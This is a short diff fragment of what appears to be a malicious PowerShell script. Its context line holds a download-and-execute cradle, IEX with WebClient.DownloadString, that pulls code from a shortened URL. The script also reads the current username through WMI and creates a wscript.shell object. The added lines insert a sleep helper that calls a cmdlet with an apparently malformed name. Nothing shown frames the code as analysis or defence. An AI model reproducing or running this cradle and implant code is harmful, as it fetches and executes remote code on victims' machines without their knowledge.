@@ -22,12 +22,17 @@ powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.
 "@
 }
 
-Install
+Install -sting test
 
 $ps = "";
 $id = Get-Random
 $username=( ( Get-WMIObject -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $wshell = New-Object -ComObject wscript.shell;
+
+function wait {
+param($wwee)
+Sleep-Start -m $wwee
+}
 
 function K {
  param($String)
